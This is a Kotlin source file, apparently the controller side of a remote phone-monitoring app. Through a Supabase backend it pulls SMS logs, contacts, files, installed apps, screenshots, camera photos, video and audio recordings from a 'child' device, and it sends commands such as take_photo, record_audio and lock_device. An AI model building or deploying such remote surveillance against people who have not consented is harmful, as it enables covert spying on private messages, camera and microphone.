package com.example.admin

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.telephony.TelephonyManager
import androidx.core.app.ActivityCompat
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException

class SupabaseAdminConnector {
    private val client = OkHttpClient()
    private var rootUrl = "https://qwtkuzuuskevtptetnvb.supabase.co"
    private var anonKey = "YOUR_ANON_KEY"

    fun updateConfig(url: String, key: String) {
        val trimmed = url.trim().removeSuffix("/")
        val withProtocol = if (!trimmed.startsWith("http://") && !trimmed.startsWith("https://") && trimmed.isNotEmpty()) {
            "https://$trimmed"
        } else {
            trimmed
        }
        rootUrl = withProtocol
        anonKey = key.trim()
    }
    
    fun getRootUrl(): String = rootUrl

    private fun Request.Builder.addSupabaseHeaders(): Request.Builder {
        return this.header("apikey", anonKey)
            .header("Authorization", "Bearer $anonKey")
            .header("Content-Profile", "public")
            .header("Cache-Control", "no-cache")
            .header("Pragma", "no-cache")
    }

    // Devices
    suspend fun getDiscoveredDevices(): List<Device> = withContext(Dispatchers.IO) {
        val listFromDevice = fetchFromTable("device")
        if (listFromDevice.isNotEmpty()) {
            return@withContext listFromDevice
        }
        return@withContext fetchFromTable("devices")
    }

    private suspend fun fetchFromTable(tableName: String): List<Device> {
        try {
            val request = Request.Builder()
                .url("$rootUrl/rest/v1/$tableName")
                .addSupabaseHeaders()
                .get()
                .build()
            
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return emptyList()
                val bodyStr = response.body?.string() ?: return emptyList()
                val devicesList = mutableListOf<Device>()
                
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val childObj = arr.optJSONObject(i) ?: continue
                        
                        // Parse ISO timestamp to epoch ms for lastActive
                        val lastUpdatedStr = childObj.optString("last_updated")
                        var lastActiveMs = 0L
                        if (lastUpdatedStr.isNotBlank() && lastUpdatedStr != "null") {
                            try {
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                                    val instant = java.time.Instant.parse(lastUpdatedStr.replace(" ", "T"))
                                    lastActiveMs = instant.toEpochMilli()
                                } else {
                                    val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.US)
                                    sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
                                    lastActiveMs = sdf.parse(lastUpdatedStr.replace("Z", ""))?.time ?: 0L
                                }
                            } catch (e: Exception) {
                                e.printStackTrace()
                            }
                        }

                        val tokenVal = if (childObj.has("token")) childObj.optString("token") else childObj.optString("device_token")
                        if (tokenVal.isNullOrBlank() || tokenVal == "null") continue

                        devicesList.add(
                            Device(
                                id = tokenVal,
                                name = childObj.optString("device_name", "Unknown Device"),
                                battery = childObj.optInt("battery", 0),
                                lastActive = lastActiveMs,
                                storageUsed = childObj.optLong("storage_used", 0L),
                                storageTotal = childObj.optLong("storage_total", 0L),
                                isLocked = false,
                                networkType = childObj.optString("net_type").takeIf { it.isNotBlank() && it != "null" },
                                carrierName = childObj.optString("net_name").takeIf { it.isNotBlank() && it != "null" },
                                isCharging = childObj.optString("status") == "charging",
                                status = childObj.optString("status")
                            )
                        )
                    }
                }
                return devicesList
            }
        } catch (e: Exception) {
            Log.e("SupabaseConnector", "Error fetching devices from table: $tableName", e)
            return emptyList()
        }
    }

    suspend fun updateLockInDatabase(deviceToken: String, isLocked: Boolean): Boolean = withContext(Dispatchers.IO) {
        val url = "$rootUrl/rest/v1/devices?device_token=eq.$deviceToken"
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val json = JSONObject().apply { put("is_locked", isLocked) }
        val body = json.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .addSupabaseHeaders()
            .patch(body)
            .build()
        try {
            client.newCall(request).execute().use { return@withContext it.isSuccessful }
        } catch (e: Exception) { return@withContext false }
    }

    suspend fun markDeviceDisconnected(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
        val isoTimestamp = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            java.time.Instant.now().toString()
        } else {
            val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US)
            sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
            sdf.format(java.util.Date())
        }

        val json = JSONObject().apply {
            put("status", "disconnected")
            put("last_updated", isoTimestamp)
        }

        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = json.toString().toRequestBody(mediaType)
        var success = false
        for (tableName in listOf("device", "devices")) {
            val fieldName = if (tableName == "device") "token" else "device_token"
            val url = "$rootUrl/rest/v1/$tableName?$fieldName=eq.$deviceToken"
            val request = Request.Builder()
                .url(url)
                .addSupabaseHeaders()
                .patch(body)
                .build()
            try {
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        success = true
                        Log.d("SupabaseConnector", "Successfully marked device as disconnected in $tableName table.")
                    }
                }
            } catch (e: Exception) {
                Log.e("SupabaseConnector", "Failed to update disconnect status in $tableName table", e)
            }
        }
        return@withContext success
    }

    suspend fun sendCommandToChild(
        deviceToken: String, 
        commandType: String, 
        additionalParams: Map<String, Any> = emptyMap(),
        commandTimestamp: Long = System.currentTimeMillis()
    ): Boolean = withContext(Dispatchers.IO) {
        
        val url = "$rootUrl/rest/v1/commands"
        
        val paramsJson = JSONObject()
        additionalParams.forEach { (key, value) -> paramsJson.put(key, value) }

        val commandId = java.util.UUID.randomUUID().toString()
        val commandJson = JSONObject().apply {
            put("id", commandId)
            put("device_token", deviceToken)
            put("command", commandType)
            put("status", "pending")
            put("timestamp", commandTimestamp)
            if (additionalParams.isNotEmpty()) {
                put("params", paramsJson)
            }
        }

        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = commandJson.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .addSupabaseHeaders()
            .post(body)
            .build()


        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    val errorBody = response.body?.string()
                    Log.e("SupabaseConnector", "Error sending command: ${response.code} $errorBody")
                    throw Exception("HTTP ${response.code}: $errorBody")
                }
                if (response.isSuccessful && (commandType == "lock_device" || commandType == "unlock_device")) {
                    updateLockInDatabase(deviceToken, commandType == "lock_device")
                }
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) { 
            Log.e("SupabaseConnector", "Exception sending command", e)
            throw e
        }
    }

    suspend fun getCommandStatus(deviceToken: String, commandTimestamp: Long): Triple<String, String, Long>? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/commands?device_token=eq.$deviceToken&timestamp=eq.$commandTimestamp&limit=1")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    if (arr.length() > 0) {
                        val obj = arr.optJSONObject(0)
                        return@withContext Triple(
                            obj.optString("status", "unknown"),
                            "تم تنفيذ العملية بنجاح",
                            obj.optLong("timestamp", 0L)
                        )
                    }
                }
                return@withContext null
            }
        } catch (e: Exception) { return@withContext null }
    }

    suspend fun clearCommandResponse(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/command_responses?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .delete()
            .build()
        try {
            client.newCall(request).execute().use { return@withContext it.isSuccessful }
        } catch (e: Exception) { return@withContext false }
    }

    suspend fun getCommandResponse(deviceToken: String): Triple<String, String, Long>? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/command_responses?device_token=eq.$deviceToken&limit=1")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    if (arr.length() > 0) {
                        val obj = arr.optJSONObject(0)
                        val status = obj.optString("status", "unknown")
                        var msg = obj.optString("response_data", "")
                        if (msg.isEmpty() || msg == "null") {
                            msg = obj.optString("message", "")
                        }
                        return@withContext Triple(
                            status,
                            msg,
                            obj.optLong("command_timestamp", 0L)
                        )
                    }
                }
                return@withContext null
            }
        } catch (e: Exception) { return@withContext null }
    }

    suspend fun getSmsLogs(deviceToken: String): List<SmsLog> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/sms_logs?device_token=eq.$deviceToken&order=timestamp.desc")
            .addSupabaseHeaders()
            .get()
            .build()
        
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<SmsLog>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(SmsLog(
                            id = obj.optString("id"),
                            sender = obj.optString("sender"),
                            body = obj.optString("body"),
                            timestamp = obj.optLong("timestamp"),
                            type = obj.optString("type")
                        ))
                    }
                }
                return@withContext list
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun getSecurityAlerts(deviceToken: String): List<SecurityAlert> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/security_alerts?device_token=eq.$deviceToken&order=timestamp.desc")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<SecurityAlert>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(SecurityAlert(
                            id = obj.optString("id"),
                            title = obj.optString("title"),
                            message = obj.optString("message"),
                            timestamp = obj.optLong("timestamp")
                        ))
                    }
                }
                return@withContext list
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun clearSecurityAlerts(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/security_alerts?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .delete()
            .build()
        client.newCall(request).execute().use { return@withContext it.isSuccessful }
    }

    suspend fun getInstalledApps(deviceToken: String): List<InstalledApp> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/installed_apps?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<InstalledApp>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(InstalledApp(
                            name = obj.optString("name"),
                            packageName = obj.optString("package_name"),
                            isSystem = obj.optBoolean("is_system")
                        ))
                    }
                }
                return@withContext list.sortedBy { it.name.lowercase() }
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun getFileSystem(deviceToken: String): List<FileItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/files?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<FileItem>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(FileItem(
                            name = obj.optString("name"),
                            path = obj.optString("path"),
                            isDir = obj.optBoolean("is_dir"),
                            size = obj.optLong("size_bytes"),
                            date = obj.optString("date")
                        ))
                    }
                }
                return@withContext list.sortedWith(compareBy<FileItem> { !it.isDir }.thenBy { it.name.lowercase() })
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    private suspend fun getMediaRecords(deviceToken: String, filterType: String): List<MediaItem> = withContext(Dispatchers.IO) {
        val list = mutableListOf<MediaItem>()

        // 1. Fetch from new media_files table 
        try {
            val mediaTypes = when(filterType) {
                "camera_photo" -> listOf("take_photo", "take_photo_front", "take_photo_back")
                "video_record" -> listOf("record_video", "record_video_front", "record_video_back")
                "audio_record" -> listOf("record_audio", "capture_audio")
                "screenshot" -> listOf("take_screenshot", "screenshot")
                else -> listOf(filterType)
            }
            val typesFilter = mediaTypes.joinToString(",")
            val request = Request.Builder()
                .url("$rootUrl/rest/v1/media_files?device_token=eq.$deviceToken&file_type=in.($typesFilter)&order=created_at.desc")
                .addSupabaseHeaders()
                .get()
                .build()

            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: ""
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        val fileUrl = obj.optString("file_url").takeIf { it.isNotBlank() && it != "null" }
                        val createdStr = obj.optString("created_at")
                        var ts = System.currentTimeMillis()
                        if (createdStr.isNotBlank() && createdStr != "null") {
                            try {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    val instant = java.time.Instant.parse(createdStr)
                                    ts = instant.toEpochMilli()
                                } else {
                                    val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSSSSZ", java.util.Locale.US)
                                    ts = sdf.parse(createdStr)?.time ?: System.currentTimeMillis()
                                }
                            } catch (e: Exception) {
                                // fallback
                            }
                        }
                        if (fileUrl != null) {
                            list.add(MediaItem(
                                id = obj.optString("id"),
                                base64 = "",
                                url = fileUrl,
                                timestamp = ts,
                                type = filterType,
                                cameraType = null
                            ))
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("SupabaseConnector", "Error fetching from media_files", e)
        }

        // 2. Fetch from old commands table
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/commands?device_token=eq.$deviceToken&order=timestamp.desc")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext list
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        val cmdType = obj.optString("command")
                        
                        // Map the commands to our filterTypes
                        // filterType is "camera_photo", "video_record", "audio_record", "screenshot"
                        val isMatch = when(filterType) {
                            "camera_photo" -> cmdType == "take_photo" || cmdType == "take_photo_front" || cmdType == "take_photo_back"
                            "video_record" -> cmdType == "record_video" || cmdType == "record_video_front" || cmdType == "record_video_back"
                            "audio_record" -> cmdType == "record_audio" || cmdType == "capture_audio"
                            "screenshot" -> cmdType == "take_screenshot" || cmdType == "screenshot"
                            else -> false
                        }
                        
                        if (!isMatch) continue

                        val b64 = obj.optString("response_data").takeIf { it.isNotBlank() && it != "null" }
                               ?: obj.optString("command_response").takeIf { it.isNotBlank() && it != "null" }
                               ?: obj.optString("result").takeIf { it.isNotBlank() && it != "null" }
                               ?: obj.optString("image_code").takeIf { it.isNotBlank() && it != "null" }
                               ?: obj.optString("base64_data").takeIf { it.isNotBlank() && it != "null" }
                               ?: obj.optString("response").takeIf { it.isNotBlank() && it != "null" }
                               
                        if (b64 != null) {
                            list.add(MediaItem(
                                id = obj.optString("id"),
                                base64 = b64,
                                url = "",
                                timestamp = obj.optLong("timestamp"),
                                type = filterType,
                                cameraType = null
                            ))
                        }
                    }
                }
                return@withContext list.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) { return@withContext list }
    }

    suspend fun getScreenshots(deviceToken: String): List<MediaItem> = getMediaRecords(deviceToken, "screenshot")
    suspend fun getCameraPhotos(deviceToken: String) = getMediaRecords(deviceToken, "camera_photo")
    suspend fun getCameraVideos(deviceToken: String) = getMediaRecords(deviceToken, "video_record")
    suspend fun getAudioRecords(deviceToken: String) = getMediaRecords(deviceToken, "audio_record")

    suspend fun getAllMediaFiles(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
        val list = mutableListOf<MediaItem>()
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/media_files?token=eq.$deviceToken&order=created_at.desc")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        val fileUrl = obj.optString("file_url").takeIf { it.isNotBlank() && it != "null" }
                        val fileType = obj.optString("file_type")
                        val commandSource = obj.optString("command_source")
                        val createdStr = obj.optString("created_at")
                        var ts = System.currentTimeMillis()
                        if (createdStr.isNotBlank() && createdStr != "null") {
                            try {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    val instant = java.time.Instant.parse(createdStr)
                                    ts = instant.toEpochMilli()
                                } else {
                                    val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSSSSZ", java.util.Locale.US)
                                    ts = sdf.parse(createdStr)?.time ?: System.currentTimeMillis()
                                }
                            } catch (e: Exception) {}
                        }
                        if (fileUrl != null) {
                            list.add(MediaItem(
                                id = obj.optString("id"),
                                url = fileUrl,
                                base64 = "",
                                timestamp = ts,
                                type = fileType,
                                commandSource = commandSource
                            ))
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("SupabaseConnector", "Error fetching all media files", e)
        }
        return@withContext list
    }

    suspend fun getContacts(deviceToken: String): List<Contact> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/contacts?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<Contact>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(Contact(
                            id = obj.optString("id"),
                            name = obj.optString("name"),
                            number = obj.optString("number")
                        ))
                    }
                }
                return@withContext list.sortedBy { it.name.lowercase() }
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun deleteMediaItem(deviceToken: String, category: String, itemId: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/commands?id=eq.$itemId")
            .addSupabaseHeaders()
            .delete()
            .build()
        try {
            client.newCall(request).execute().use { return@withContext it.isSuccessful }
        } catch (e: Exception) { return@withContext false }
    }

    suspend fun getCameraStreamState(deviceToken: String): CameraStreamState? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/camera_stream?device_token=eq.$deviceToken&order=timestamp.desc&limit=1")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    if (arr.length() > 0) {
                        val obj = arr.optJSONObject(0)
                        
                        val imageBase64 = obj.optString("image").takeIf { it.isNotBlank() && it != "null" }
                        val streamUrlVal = obj.optString("stream_url").takeIf { it.isNotBlank() && it != "null" }
                        val actualStreamUrl = if (imageBase64?.startsWith("rtsp://") == true || imageBase64?.startsWith("http") == true) imageBase64 else streamUrlVal
                        val actualImage = if (actualStreamUrl != null && actualStreamUrl == imageBase64) null else imageBase64

                        return@withContext CameraStreamState(
                            isActive = obj.optBoolean("is_active"),
                            image = actualImage,
                            streamUrl = actualStreamUrl,
                            cameraType = obj.optString("camera_type", "back"),
                            timestamp = obj.optLong("timestamp"),
                            error = obj.optString("error").takeIf { it.isNotBlank() && it != "null" }
                        )
                    }
                }
                return@withContext null
            }
        } catch (e: Exception) { return@withContext null }
    }

    suspend fun getLiveStreamState(deviceToken: String): LiveStreamState? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/live_streams?device_token=eq.$deviceToken&order=timestamp.desc&limit=1")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    if (arr.length() > 0) {
                        val obj = arr.optJSONObject(0)
                        return@withContext LiveStreamState(
                            isActive = obj.optBoolean("is_active"),
                            image = obj.optString("image").takeIf { it.isNotBlank() && it != "null" },
                            streamUrl = obj.optString("stream_url").takeIf { it.isNotBlank() && it != "null" },
                            timestamp = obj.optLong("timestamp"),
                            error = obj.optString("error").takeIf { it.isNotBlank() && it != "null" }
                        )
                    }
                }
                return@withContext null
            }
        } catch (e: Exception) { return@withContext null }
    }

    suspend fun listenToCameraStream(deviceToken: String, onUpdate: (CameraStreamState?) -> Unit) = withContext(Dispatchers.IO) {
        var isStreaming = true
        while (isStreaming && isActive) {
            try {
                val request = Request.Builder()
                    .url("$rootUrl/rest/v1/camera_stream?device_token=eq.$deviceToken&order=timestamp.desc&limit=1")
                    .addSupabaseHeaders()
                    .get()
                    .build()
                    
                client.newCall(request).execute().use { response ->
                    val bodyStr = response.body?.string()
                    if (bodyStr != null && bodyStr.startsWith("[")) {
                        val arr = JSONArray(bodyStr)
                        if (arr.length() > 0) {
                            val obj = arr.optJSONObject(0)
                            val isActiveVal = obj.optBoolean("is_active")
                            
                            val imageBase64 = obj.optString("image").takeIf { it.isNotBlank() && it != "null" }
                            val streamUrlVal = obj.optString("stream_url").takeIf { it.isNotBlank() && it != "null" }
                            val actualStreamUrl = if (imageBase64?.startsWith("rtsp://") == true || imageBase64?.startsWith("http") == true) imageBase64 else streamUrlVal
                            val actualImage = if (actualStreamUrl != null && actualStreamUrl == imageBase64) null else imageBase64
                            
                            onUpdate(
                                CameraStreamState(
                                    isActive = isActiveVal,
                                    image = actualImage,
                                    streamUrl = actualStreamUrl,
                                    cameraType = obj.optString("camera_type", "back"),
                                    timestamp = obj.optLong("timestamp"),
                                    error = obj.optString("error").takeIf { it.isNotBlank() && it != "null" },
                                    isLoading = false
                                )
                            )
                            if (!isActiveVal) {
                                isStreaming = false
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                // Ignore silent errors during polling
            }
            delay(500) // Poll every 500ms
        }
    }

    suspend fun registerNewDeviceToken(context: Context, deviceToken: String, deviceName: String): Boolean = withContext(Dispatchers.IO) {
        val url = "$rootUrl/rest/v1/devices"
        
        // Dynamic device properties
        val batteryPct = try {
            val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) ((level.toFloat() / scale.toFloat()) * 100).toInt() else 85
        } catch (e: Exception) { 85 }

        val isChargingValue = try {
            val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
            status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL
        } catch (e: Exception) { false }

        val storageTotalVal = try {
            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            stat.blockCountLong * stat.blockSizeLong
        } catch (e: Exception) { 64L * 1024 * 1024 * 1024 }

        val storageUsedVal = try {
            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val total = stat.blockCountLong * stat.blockSizeLong
            val free = stat.availableBlocksLong * stat.blockSizeLong
            total - free
        } catch (e: Exception) { 12L * 1024 * 1024 * 1024 }

        val netType = getNetworkType(context)
        val carrierName = getCarrierName(context)
        val finalNetworkType = if (netType == "WiFi" || netType == "Wi-Fi") {
            "WiFi"
        } else if (netType.contains("لا يوجد") || netType.contains("غير معروفة")) {
            netType
        } else {
            "$netType ($carrierName)"
        }

        val deviceJson = JSONObject().apply {
            put("device_token", deviceToken)
            put("name", deviceName)
            put("battery", batteryPct)
            put("last_active", System.currentTimeMillis())
            put("storage_used", storageUsedVal)
            put("storage_total", storageTotalVal)
            put("is_locked", false)
            put("network_type", finalNetworkType)
            put("is_charging", isChargingValue)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = deviceJson.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .addSupabaseHeaders()
            .header("Prefer", "resolution=merge-duplicates")
            .post(body)
            .build()
        try {
            client.newCall(request).execute().use { return@withContext it.isSuccessful }
        } catch (e: Exception) { return@withContext false }
    }

    // الدالة الرئيسية لفحص نوع الشبكة
    fun getNetworkType(context: Context): String {
        return try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return "لا يوجد اتصال بالإنترنت"
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return "لا يوجد اتصال بالإنترنت"

            when {
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> getCellularNetworkGeneration(context)
                else -> "شبكة غير معروفة"
            }
        } catch (e: Exception) {
            "WiFi"
        }
    }

    // الدالة الفرعية لمعرفة جيل شبكة الهاتف (2G, 3G, 4G, 5G)
    private fun getCellularNetworkGeneration(context: Context): String {
        return try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            // التحقق من منح صلاحية READ_PHONE_STATE المطلوبة لجلب تفاصيل الشبكة الخلوية
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                return "بيانات هاتف (الصلاحية غير ممنوحة)"
            }

            // جلب نوع الشبكة حسب إصدار الأندرويد
            val networkType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                telephonyManager.dataNetworkType
            } else {
                telephonyManager.networkType
            }

            when (networkType) {
                TelephonyManager.NETWORK_TYPE_GPRS,
                TelephonyManager.NETWORK_TYPE_EDGE,
                TelephonyManager.NETWORK_TYPE_CDMA,
                TelephonyManager.NETWORK_TYPE_1xRTT,
                TelephonyManager.NETWORK_TYPE_IDEN -> "2G"

                TelephonyManager.NETWORK_TYPE_UMTS,
                TelephonyManager.NETWORK_TYPE_EVDO_0,
                TelephonyManager.NETWORK_TYPE_EVDO_A,
                TelephonyManager.NETWORK_TYPE_HSDPA,
                TelephonyManager.NETWORK_TYPE_HSUPA,
                TelephonyManager.NETWORK_TYPE_HSPA,
                TelephonyManager.NETWORK_TYPE_EVDO_B,
                TelephonyManager.NETWORK_TYPE_EHRPD,
                TelephonyManager.NETWORK_TYPE_HSPAP -> "3G"

                TelephonyManager.NETWORK_TYPE_LTE -> "4G"
                TelephonyManager.NETWORK_TYPE_NR -> "5G"
                else -> "بيانات هاتف"
            }
        } catch (e: Exception) {
            "بيانات هاتف"
        }
    }

    // دالة جديدة لجلب اسم شركة الاتصالات 
    fun getCarrierName(context: Context): String {
        return try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            
            // جلب اسم الشبكة التي يتصل بها المستخدم حالياً
            val operatorName = telephonyManager.networkOperatorName
            
            if (operatorName.isNullOrEmpty()) {
                "لا توجد شريحة أو شبكة غير معروفة"
            } else {
                operatorName
            }
        } catch (e: Exception) {
            "غير معروفة"
        }
    }
}
